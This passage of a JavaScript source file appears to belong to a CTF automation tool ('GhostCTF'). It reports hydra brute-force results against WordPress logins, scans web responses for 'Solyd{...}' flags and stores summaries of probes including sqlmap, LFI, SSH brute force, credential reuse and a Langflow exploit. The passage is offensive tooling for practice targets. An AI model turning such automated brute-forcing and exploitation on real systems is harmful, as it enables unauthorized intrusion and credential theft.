            value: `WP login (hydra): ${hr.username}`,
            meta: `password=${hr.password} · ${hr.loginUrl || uniq[0] || ''}`,
            url: hr.loginUrl || uniq[0] || null,
          },
          'secrets',
        );
        intel(`WP BRUTE: ${hr.username}:${hr.password} — confirma no browser`);
      } else if (hr.error) {
        wpHydraBruteSummary.error = hr.error;
      }
    } catch (e) {
      wpHydraBruteSummary.error = e?.message || String(e);
      log(`WP brute (hydra): ${wpHydraBruteSummary.error}`, 'warn');
    }
  }

  log('Scan de flags Solyd{...} e validação do formato (com base64/base32 decoding)...', 'info');

  ingestFlagFindingsFromFindingsArtifacts({
    findings,
    platformId,
    foundFlagSet,
    addFinding,
    log,
  });

  ingestFlagFindingsFromWebResponses({
    webResponses,
    platformId,
    foundFlagSet,
    addFinding,
    log,
    maxTextLen: 900_000,
  });

  // stats “params” conta flags novas (deduplicadas)
  pipe('params', 'done');

  // Playbook final (pós-params): já inclui achados contextuais (LFI/SQLMap/etc).
  try {
    const sug = buildCtfPlaybookSuggestions({ ip, findings, flagPathHttpProbe: ctfFlagPathProbeSummary });
    for (const s of sug.slice(0, 10)) {
      intel(`PLAYBOOK+ (${String(s.prio).toUpperCase()}): ${s.title}`);
      for (const step of s.steps.slice(0, 6)) intel(`  - ${step}`);
    }
  } catch (e) {
    log(`playbook final: ${e?.message || String(e)}`, 'warn');
  }

  progress(92);

  // 8) JS / DECODER STAGE (mapa para "js") - já fizemos decoding; mantém visual coerente
  pipe('js', 'active');
  pipe('js', 'done');

  // 9) DORKS / FLAGS VALIDATION (mapa para "dorks")
  pipe('dorks', 'active');
  pipe('dorks', 'done');

  // 10) SECRETS / VECTORS (mapa para "secrets") - MVP sem exploração ativa automática
  pipe('secrets', 'active');
  log('Módulos de exploração (SQLi/LFI/XSS/PrivEsc) ainda não estão no MVP — foco em Recon + Flags.', 'warn');
  pipe('secrets', 'done');

  // 11) KALI / EXPLOIT (skip)
  pipe('kali', 'skip');

  // 12) SCORE (final)
  pipe('score', 'active');
  progress(100);
  pipe('score', 'done');

  markTiming('beforeCorrelationSave');
  const totalRunMs = Math.round(Date.now() - tPipeline0);

  const modulesForDb = [
    '__ghostctf__',
    `platform:${platformId}`,
    udpScan ? 'udpScan' : 'udpScan:off',
    tcpAllPorts ? 'tcpAllPorts' : 'tcpAllPorts:off',
    ...modules,
  ];

  const corr = {
    ip,
    platformId,
    timingsMs,
    totalRunMs,
    udpScan,
    tcpAllPorts,
    pagesFetched:
      (pagesFetched || 0) +
      (linkPagesFetched || 0) +
      (robotsFetched || 0) +
      (robotsDisallowFetched || 0),
    linkPagesFetched: linkPagesFetched || 0,
    robotsFetched: robotsFetched || 0,
    robotsDisallowFetched: robotsDisallowFetched || 0,
    etcHosts: {
      enabled: etcHostsSummary.enabled,
      hosts: etcHostsSummary.hosts || [],
      /** Só entradas cujo IP no `/etc/hosts` local coincide com o alvo (antes do merge com a UI). */
      localFileHosts: etcHostsSummary.localFileHosts || [],
      urls: etcHostsSummary.urls || 0,
      hostsOnlyWeb: Boolean(useHostsOnlyWeb),
    },
    flagsFound: foundFlagSet.size,
    dirEnumTools: dirEnumToolsAgg,
    ftpAnonymous: {
      tried: ftpAnonymousSummary.tried,
      okPorts: ftpAnonymousSummary.successPorts,
      errors: ftpAnonymousSummary.errors,
    },
    sshProbe: {
      tried: sshSummary.tried,
      okPorts: sshSummary.okPorts,
      errors: sshSummary.errors,
    },
    mysqlProbe: {
      tried: mysqlSummary.tried,
      okPorts: mysqlSummary.okPorts,
      errors: mysqlSummary.errors,
    },
    lfiProbe: {
      attempts: lfiSummary.attempts,
      hits: lfiSummary.hits,
    },
    sqlmapProbe: {
      enabled: sqlmapSummary.enabled,
      attempts: sqlmapSummary.attempts,
      hits: sqlmapSummary.hits,
    },
    sqlmapWsProbe: sqlmapWsSummary,
    tinyFmProbe: tinyFmSummary,
    activeMqProbe: activeMqSummary,
    hydraWpBruteProbe: wpHydraBruteSummary,
    vhostSitemapProbe: vhostSitemapSummary,
    disclosureProbe: disclosureSummary,
    credReuseProbe: credReuseSummary,
    wpFocusProbe: wpFocusSummary,
    extendedServiceProbe: extendedSvcSummary,
    secondaryMysqlProbe: secondaryMysqlSummary,
    openapiProbe: openapiSummary,
    vhostPrefixFuzz: vhostFuzzSummary,
    sshBruteProbe: sshBruteSummary,
    langflowExploitProbe: langflowExploitSummary,
    uploadSurfaceProbe: uploadSurfaceSummary,
    ctfFlagPathProbe: ctfFlagPathProbeSummary,
  };

  let saved = null;
  let runId = null;
  let intelMerge = null;
  try {
    saved = await saveRun({
      target: ip,
      exactMatch: false,
      modules: modulesForDb,
      stats: { ...stats },
      findings,
      correlation: corr,
    });
    if (saved != null) {
      runId = saved.runId;
      intelMerge = saved.intelMerge;
      log(`GhostCTF salvo — run #${runId}`, 'success');
    }
  } catch (e) {
    log(`Erro ao salvar no DB: ${e?.message || String(e)}`, 'warn');
  }

  emit({
    type: 'done',
    target: ip,
    platform: platformId,
    findings,
    stats,
    correlation: corr,
    runId,
    intelMerge,
    storage: null,
  });

  return { runId, findings, stats, intelMerge, correlation: corr };
}
